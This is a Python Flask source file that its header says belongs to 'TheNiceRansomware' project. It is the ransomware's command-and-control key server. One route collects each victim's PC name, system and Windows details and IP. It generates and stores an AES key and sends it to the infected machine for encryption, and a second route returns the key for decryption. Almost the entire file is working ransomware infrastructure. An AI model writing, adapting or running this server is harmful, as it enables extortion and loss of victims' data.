'''
__author__ = "Dor Alt"
__email__ = "agentzex@gmail.com"

This program is part of the TheNiceRansomware project: https://github.com/dor-alt/The-Nice-Ransomware
Please look there for more instructions.

'''
from flask import Flask, request, jsonify, make_response
import socket
import os
import victims_details
import cryptor



SERVER_HOSTNAME = socket.gethostname()
SERVER_IP = socket.gethostbyname(SERVER_HOSTNAME)
PID = str(os.getpid())

print("HTTP Server started on: " + SERVER_HOSTNAME + " with IP: " + SERVER_IP + "\nPID: " + PID)
app = Flask(__name__)


@app.route('/get_key', methods=['POST'])
def get_key():
    if request.method == 'POST':
        fields = []
        for key, value in request.values.iteritems():
            fields.append(key[:15] + " - " + value[:50])
        fields = "; ".join(fields)
        client_ip = request.remote_addr

        print("'/get_key' -  incoming request from IP: " + client_ip + "\nData: " + fields)
        try:
            pc_name = request.values["pc_name"]
            pc_details = request.values["pc_details"]
            windows_details = request.values["windows_details"]
        except Exception, e:
            print("Error gathering values from client. Error was: " + str(e))
            return send_http_response("3", "", "")

        base64_aes_key = cryptor.generate_key()
        unique_id = cryptor.generate_unique_id(pc_name, client_ip)
        if not victims_details.dump_to_json(pc_details, pc_name, windows_details, base64_aes_key, unique_id, client_ip):
            # key for this PC already exists so we're not gonna create another one for encryption
            print("Error: unique id for this agent already found in DB")
            return send_http_response("2", "", "")

        print("Sending generated AES key and unique id to agent for encryption")
        return send_http_response("1", base64_aes_key, unique_id)


@app.route('/send_key', methods=['POST'])
def send_key():
    if request.method == 'POST':
        fields = []
        for key, value in request.values.iteritems():
            fields.append(key[:15] + " - " + value[:50])
        fields = "; ".join(fields)
        client_ip = request.remote_addr

        print("'/send_key' -  incoming request from IP: " + client_ip + "\nData: " + fields)
        try:
            unique_id = request.values["unique_id"]
        except Exception, e:
            print("Error gathering values from client. Error was: " + str(e))
            return send_http_response("3", "", "")

        victim_key = victims_details.get_victim_key(unique_id)
        if not victim_key:
            #unique id not found in server
            print("Error: unique id for this agent not found in the DB")
            return send_http_response("4", "", "")

        print("Sending AES key to agent for decryption")
        return send_http_response("1", victim_key, "")


def send_http_response(status, base64_aes_key, unique_id):
    # 1 = ok . 2 = error - already ran. 3 = parameters error . 4 - unique_id not found
    response = make_response(jsonify(status=status, base64_aes_key=base64_aes_key, unique_id=unique_id))
    return response



if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)

